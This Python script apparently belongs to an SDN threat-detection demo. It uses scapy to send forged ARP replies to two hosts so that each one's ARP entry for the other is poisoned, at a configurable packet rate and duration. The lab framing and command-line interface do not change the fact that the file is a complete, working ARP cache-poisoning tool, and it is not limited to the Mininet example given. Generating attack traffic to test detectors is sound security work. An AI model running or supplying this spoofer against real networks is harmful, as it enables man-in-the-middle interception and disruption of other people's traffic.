#!/usr/bin/env python3
"""Run a controlled ARP spoofing traffic pattern from a Mininet host.

Example usage (from the Mininet CLI):
    mininet> hacker .venv/bin/python3 src/scripts/arp_spoof.py \
        --victim-a-ip 10.0.3.10 --victim-a-mac 00:00:00:00:03:10 \
        --victim-b-ip 10.0.3.20 --victim-b-mac 00:00:00:00:03:20 -d 30 -p 10
"""

from __future__ import annotations

import argparse
import time
from ipaddress import IPv4Address

import scapy.all as scapy  # type: ignore[import-untyped]

FILE_NAME = __file__.split("/")[-1]

# Default spoofing profile for demo traffic generation.
DEFAULT_ARP_SPOOF_DURATION = 30
DEFAULT_ARP_SPOOF_PPS = 10


def arp_spoof(
    victim_a_ip: IPv4Address,
    victim_a_mac: str,
    victim_b_ip: IPv4Address,
    victim_b_mac: str,
    *,
    duration: int = DEFAULT_ARP_SPOOF_DURATION,
    pps: int = DEFAULT_ARP_SPOOF_PPS,
    interface: str | None = None,
) -> None:
    """Send forged ARP replies to poison two hosts' ARP entries.

    Args:
        victim_a_ip: First victim IPv4 address.
        victim_a_mac: First victim MAC address.
        victim_b_ip: Second victim IPv4 address.
        victim_b_mac: Second victim MAC address.
        duration: How long to sustain spoofing in seconds.
        pps: ARP reply pairs per second.
        interface: Optional interface name used for sending packets.
    """
    if duration <= 0:
        msg = "Duration must be greater than 0"
        raise ValueError(msg)
    if pps <= 0:
        msg = "Packets per second must be greater than 0"
        raise ValueError(msg)

    interval = 1.0 / pps
    end_time = time.monotonic() + duration
    sent_packets = 0

    print(
        f"[{FILE_NAME}] victim_a={victim_a_ip}/{victim_a_mac} "
        f"victim_b={victim_b_ip}/{victim_b_mac} {duration=}s {pps=}"
    )

    while time.monotonic() < end_time:
        poison_a = scapy.ARP(
            op=2,
            psrc=str(victim_b_ip),
            pdst=str(victim_a_ip),
            hwdst=victim_a_mac,
        )
        poison_b = scapy.ARP(
            op=2,
            psrc=str(victim_a_ip),
            pdst=str(victim_b_ip),
            hwdst=victim_b_mac,
        )
        scapy.send(poison_a, verbose=False, iface=interface)
        scapy.send(poison_b, verbose=False, iface=interface)
        sent_packets += 2
        time.sleep(interval)

    print(f"[{FILE_NAME}] done - {sent_packets} forged ARP replies sent")


def _build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Generate ARP spoofing traffic for SDN threat detection demo."
    )
    parser.add_argument(
        "--victim-a-ip",
        required=True,
        type=IPv4Address,
        help="First victim IPv4 address",
    )
    parser.add_argument(
        "--victim-a-mac",
        required=True,
        type=str,
        help="First victim MAC address",
    )
    parser.add_argument(
        "--victim-b-ip",
        required=True,
        type=IPv4Address,
        help="Second victim IPv4 address",
    )
    parser.add_argument(
        "--victim-b-mac",
        required=True,
        type=str,
        help="Second victim MAC address",
    )
    parser.add_argument(
        "-d",
        "--duration",
        type=int,
        default=DEFAULT_ARP_SPOOF_DURATION,
        help="Spoof duration in seconds (default: %(default)s)",
    )
    parser.add_argument(
        "-p",
        "--pps",
        type=int,
        default=DEFAULT_ARP_SPOOF_PPS,
        help="ARP reply pairs per second (default: %(default)s)",
    )
    parser.add_argument(
        "-i",
        "--interface",
        type=str,
        default=None,
        help="Optional egress interface",
    )
    return parser


def main() -> None:
    """Entry point for the script."""
    args = _build_parser().parse_args()
    arp_spoof(
        args.victim_a_ip,
        args.victim_a_mac,
        args.victim_b_ip,
        args.victim_b_mac,
        duration=args.duration,
        pps=args.pps,
        interface=args.interface,
    )


if __name__ == "__main__":
    main()
